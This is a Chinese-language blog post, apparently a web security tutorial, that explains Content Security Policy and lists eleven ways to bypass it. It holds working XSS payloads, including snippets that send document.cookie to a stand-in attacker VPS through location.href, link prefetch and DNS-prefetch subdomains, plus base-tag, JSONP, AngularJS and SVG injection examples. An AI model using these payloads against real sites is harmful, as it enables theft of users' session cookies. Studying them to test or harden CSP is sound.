@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/w.ico?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/w.ico?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.7.0',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="##0X00 前言由于最近被问到CSP绕过的一些技巧，平时虽然在xss、jsonp劫持中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。">
+<meta name="keywords" content="bypass,前端安全,CSP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="learning_CSP">
+<meta property="og:url" content="http://sunu11.com/2019/12/13/learning-CSP/index.html">
+<meta property="og:site_name" content="SuNu11&#39;Blog">
+<meta property="og:description" content="##0X00 前言由于最近被问到CSP绕过的一些技巧，平时虽然在xss、jsonp劫持中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-12-13T02:28:53.978Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="learning_CSP">
+<meta name="twitter:description" content="##0X00 前言由于最近被问到CSP绕过的一些技巧，平时虽然在xss、jsonp劫持中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="SuNu11'Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="http://sunu11.com/2019/12/13/learning-CSP/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>learning_CSP | SuNu11'Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">SuNu11'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <h1 class="site-subtitle" itemprop="description">记录分享学习生活</h1>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-首页">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-分类">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-归档">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-标签">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-关于">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-导航图">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Guide/" rel="section"><i class="menu-item-icon fa fa-fw fa-globe"></i> <br>导航图</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-公益404">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/404.html" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益404</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://sunu11.com/2019/12/13/learning-CSP/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="SuNu11">
+      <meta itemprop="description" content="淡泊以明志，宁静以致远">
+      <meta itemprop="image" content="/images/me.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SuNu11'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">learning_CSP
+
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-12-13 08:45:05 / Modified: 10:28:53" itemprop="dateCreated datePublished" datetime="2019-12-13T08:45:05+08:00">2019-12-13</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>##0X00 前言<br>由于最近被问到CSP绕过的一些技巧，平时虽然在xss、jsonp劫持中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。<a id="more"></a></p>
+<h2 id="0X01-什么是CSP"><a href="#0X01-什么是CSP" class="headerlink" title="0X01 什么是CSP"></a>0X01 什么是CSP</h2><p>CSP全称Content Security Policy ,可以直接翻译为内容安全策略,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程资源）。<br>举个例子：<br>我们经常可以在http头中看到下面头信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure></p>
+<p>或者在页面中看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这两种表达的含义一致，代表了默认信任同源和<span class="exturl" data-url="aHR0cDovL3d3dy5zdW51MTEuY29t55qE6LWE5rqQ77yb6aG16Z2i5Lit5YWB6K645omn6KGMamF2YXNjcmlwdO+8jOWFgeiuuOS9v+eUqOWGheiBlOi1hOa6kOWmgmA=" title="http://www.sunu11.com的资源；页面中允许执行javascript，允许使用内联资源如`">www.sunu11.com的资源；页面中允许执行javascript，允许使用内联资源如`<i class="fa fa-external-link"></i></span><script>`标签、事件监听函数。它通过两组策略进行规定，每组策略包含一个策略指令和一个内容源列表</p>
+<p>那下面简单介绍一下常用的<strong>策略指令</strong>：<br>default-src<br>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p>
+<blockquote>
+<ul>
+<li>child-src      指定定义了 web workers 以及嵌套的浏览上下文（如<frame>和<iframe>）的源    </li>
+<li>connect-src  定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源</li>
+<li>font-src         定义了字体加载的有效来源</li>
+<li>img-src         定义了图片或者图标加载的有效来源</li>
+<li>media-src     定义了媒体文件加载的有效来源如HTML6的 <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>等元素</li>
+<li>object-src     定义页面插件的过滤策略,如 <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>或者<code>&lt;applet&gt;</code>等元素</li>
+<li>script-src      定义页面中javascript有效来源，它可以设置一些特殊值，如nonce（每次http回应给出一个授权token并内嵌脚本必须有token才会被执行）、hash（列出允许执行的脚本代码的hash值，在hash相吻合下才能执行内嵌脚本）</li>
+<li>style-src        定义页面中CSS样式的有效来源</li>
+</ul>
+</blockquote>
+<p>那啥是<strong>内容源</strong>呢：<br>内容源分三种：源列表、关键字与数据<br><strong>源列表</strong>是一个字符串,主要是指定主机或者域名，包括对应端口。可以用*来代表通配符：<br>如：</p>
+<blockquote>
+<ul>
+<li>http://*.sunu11.com</li>
+<li>sunu11.com:8080</li>
+<li><a href="https://vpn.sunu11.com">https://vpn.sunu11.com</a></li>
+</ul>
+</blockquote>
+<p>关键字主要有以下几个：</p>
+<blockquote>
+<ul>
+<li>‘none’       空，不匹配任何URL</li>
+<li>‘self’       代表与文档同源，包括相同的URL协议和端口号。</li>
+<li>‘unsafe-inline’    允许使用内联资源（javascript:URL、内联的事件处理函数与<code>&lt;style&gt;、&lt;script&gt;</code>元素），</li>
+<li>‘unsafe-eval’        允许使用eval()等通过字符串创建代理的方法</li>
+</ul>
+</blockquote>
+<p><code>使用 &#39;unsafe-inline&#39; 和 &#39;unsafe-eval&#39; 都是不安全的，它们会导致网站有跨站脚本攻击风险。</code></p>
+<p>数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:</span><br><span class="line">    允许data:URL作为内容来源</span><br><span class="line">mediastream: </span><br><span class="line">    允许mediastream:URL作为内容来源</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02如何绕过CSP限制"><a href="#0x02如何绕过CSP限制" class="headerlink" title="0x02如何绕过CSP限制"></a>0x02如何绕过CSP限制</h2><p>下面总结了一些可能遇到CSP策略后bypass的方法：</p>
+<h3 id="1、可控的CRLF漏洞点"><a href="#1、可控的CRLF漏洞点" class="headerlink" title="1、可控的CRLF漏洞点"></a>1、可控的CRLF漏洞点</h3><p>当存在CRLF漏洞，且可控点在csp上方，可以通过注入回车换行符将CSP策略挤到返回体body部分，使其失效。注入成功后，可看到回显如下图所示：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_1.png" alt="learning_csp_1"></p>
+<h3 id="2、iframe绕过"><a href="#2、iframe绕过" class="headerlink" title="2、iframe绕过"></a>2、iframe绕过</h3><p>当同源站点同时存在多个页面，可以利用没有CSP保护页面的XSS漏洞窃取被保护页面的数据：<br>比如A页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 test=“foo”&gt;A测试页面&lt;/h1&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>B页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;var iframe = document.createElement(‘iframe’);</span><br><span class="line">iframe.src=&quot;A页面&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;foo&apos;).innerHTML),1000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- 模拟XSS获取A页面的foo,使用setTimeout是需要等待iframe加载完A页面--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>当我们访问到B页面即可看到A测试页面被打印。</p>
+<h3 id="3、使用location-href"><a href="#3、使用location-href" class="headerlink" title="3、使用location.href"></a>3、使用location.href</h3><p>由于CSP不会影响location.href跳转，我们可以通过构造运行如下js，将需要的数据打回vps上：<br><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code><br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_2.png" alt="learning_csp_2"></p>
+<h3 id="4、link标签"><a href="#4、link标签" class="headerlink" title="4、link标签"></a>4、link标签</h3><p>此方法在老版本浏览器中可行，包括我们手里的xss_fuzz的字典应该也有很多使用link带外数据的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link);</span><br></pre></td></tr></table></figure></p>
+<p>也有一种方法是将cookie作为子域名，用dns通道将cookie带出去。<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    dcl = document.cookie.split(&quot;;&quot;);</span><br><span class="line">    n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0];</span><br><span class="line">    for (var i=0; i&lt;dcl.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(dcl[i]);</span><br><span class="line">        n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//&quot; + escape(dcl[i].replace(///g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/./g, &quot;-&quot;) +  &quot;.xxx.ceye.io&quot;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><em>这里要考虑到域名的命名规则是 <code>[.-a-zA-Z0-9]+</code>，所以需要对一些特殊字符进行替换,然后用ceye平台查看记录，替换特殊字符即可。</em></p>
+<h3 id="5、SVG绕过"><a href="#5、SVG绕过" class="headerlink" title="5、SVG绕过"></a>5、SVG绕过</h3><p>由于svg标签可以执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss.我们可以构造一个SVG文件，比如测试a.svg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_3.png" alt="learning_csp_3"></p>
+<h3 id="6、Base-uri绕过"><a href="#6、Base-uri绕过" class="headerlink" title="6、Base-uri绕过"></a>6、Base-uri绕过</h3><p>当服务器CSP策略script-src设置了nonce时，如果只设置了default-src没有额外设置base-uri。就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己vps地址。如果页面中script标签采用了相对路径，最终加载的js就是针对base标签中指定url的相对路径.<br>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip:prot/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我这边2.js没写内容，但可以看到成功引入。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_4.png" alt="learning_csp_4"><br><em>此方法仅限页面引用存在相对路径的<code>&lt;script&gt;</code>标签以及上述两个条件。</em></p>
+<h3 id="7、JSONP绕过CSP"><a href="#7、JSONP绕过CSP" class="headerlink" title="7、JSONP绕过CSP"></a>7、JSONP绕过CSP</h3><p>在回调函数中包装js对象的jsonp接口通常允许第三方域的脚本作为源数据来加载api数据<br>例如<code>&lt;CSP设置为default-src &#39;self&#39; ，且存在json_data.php存在可控jsonp&gt;</code><br>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos; script-src &apos;self&apos; &quot;);</span><br><span class="line">echo $_GET[&apos;foo&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>json_data.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;password&apos;,&apos;1qaz@WSX&apos;);</span><br><span class="line">header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line">$data = &quot;&#123;&apos;name&apos;:&apos;sunu11&apos;&#125;&quot;;</span><br><span class="line">echo $callback . &quot;(&quot; . json_encode($data) . &quot;)&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/test.php?foo=%3Cscript%20src=%22http://127.0.0.1:8080/json_data.php?callback=alert(document.cookie)%22%20%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_5.png" alt="learning_csp_5"><br>另外一些存在用户可控资源或jsonp较常用站点的github项目：<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a></p>
+<h3 id="8、利用浏览器补全绕过nonce："><a href="#8、利用浏览器补全绕过nonce：" class="headerlink" title="8、利用浏览器补全绕过nonce："></a>8、利用浏览器补全绕过nonce：</h3><p>如果存在CSP策略需要绕过进行XSS：<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;nonce-foo&#39;&quot;&gt;</code></p>
+<p>我们测试代码如下: <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-foo&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;foo&apos;]?&gt;</span><br><span class="line">&lt;script nonce=&apos;foo&apos;&gt;</span><br><span class="line">&lt;!-- test --&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>由于CSP 配置有nonce-foo，且在接受foo穿参后就有nonce=‘foo’，因此考虑插入<code>&lt;script src=data:text/php,alert(1),让&lt;script nonce=&#39;foo&#39;&gt;</code>前面的&lt;不被解析，而利用页面原有的<code>nonce=&#39;foo’</code>进行绕过。xss语句可构造为：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_6.png" alt="learning_csp_6"></p>
+<h3 id="9、CDN-bypass"><a href="#9、CDN-bypass" class="headerlink" title="9、CDN bypass"></a>9、CDN bypass</h3><p>在oragne大佬挖掘HackMD所存在的xss过程中，绕过CSP时发现HackMD给出的CSP信任名单有一个<code>https://cdnjs.cloudflare.com/</code>,这个cdn提供了许多第三方示例库以供引入，因此可以通过AngularJS的模板注入引入js。<br>Exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>具体分析文章可以参考:<br><a href="https://paper.seebug.org/855/">https://paper.seebug.org/855/</a></p>
+<h3 id="10、可控静态资源"><a href="#10、可控静态资源" class="headerlink" title="10、可控静态资源"></a>10、可控静态资源</h3><p>如果站点存在CSP策略限制，但受限站点有可控的静态资源，我们可以利用可控的静态资源来完成。<br>例如K1tten在 Review CodiMD 的Repo后发现的一处stored xss漏洞，也具有CSP限制。但他们通过找到<a href="http://www.google-analytics.com中提供的自定义javascript功能，再加上CSP">www.google-analytics.com中提供的自定义javascript功能，再加上CSP</a> 策略在同时有 <a href="http://www.google-analytics.com">www.google-analytics.com</a> 以及 unsafe-eval这样的配置下可以执行任意JavaScript。因此可以绕过CSP的限制执行xss。<br>具体过程可以参考K1tten的wp：<a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md</a></p>
+<h3 id="11、使用PDFxss绕过object-src"><a href="#11、使用PDFxss绕过object-src" class="headerlink" title="11、使用PDFxss绕过object-src"></a>11、使用PDFxss绕过object-src</h3><p>在CSP标准里，object-src是限制插件的src，但js并不受限制。因此我们也可以尝试通过提交pdf文件来引入js，导致客户端的弹窗与URL跳转。<br><code>&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/xxx.pdf&quot;&gt;&lt;/embed&gt;</code><br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp_7.png" alt="learning_csp_7"></p>
+<h2 id="0x03补充总结"><a href="#0x03补充总结" class="headerlink" title="0x03补充总结"></a>0x03补充总结</h2><p>考虑到上述多次提到同源策略，最后补充一下啥是同源策略：<br>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。<br>那什么是同源呢：<br>端口相同、域名相同、协议相同的站点就是同源站点。<br>举个例子：<br>相对我的站点：<br><a href="http://sunu11.com/foo/foo.php">http://sunu11.com/foo/foo.php</a><br>以下站点是否同源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://sunu11.com/foo/foo.php    不同源      </span><br><span class="line">http://sunu11.com:8080/foo/foo.php 不同源</span><br><span class="line">http://vpn.sunu11.com/foo/foo.php  不同源</span><br><span class="line">http://sunu11.com/foo/foo.php   同源</span><br></pre></td></tr></table></figure></p>
+<p>最后贴上重学CSP所参考的一些文章：</p>
+<p><a href="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137</a><br><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/">https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives</a></p>
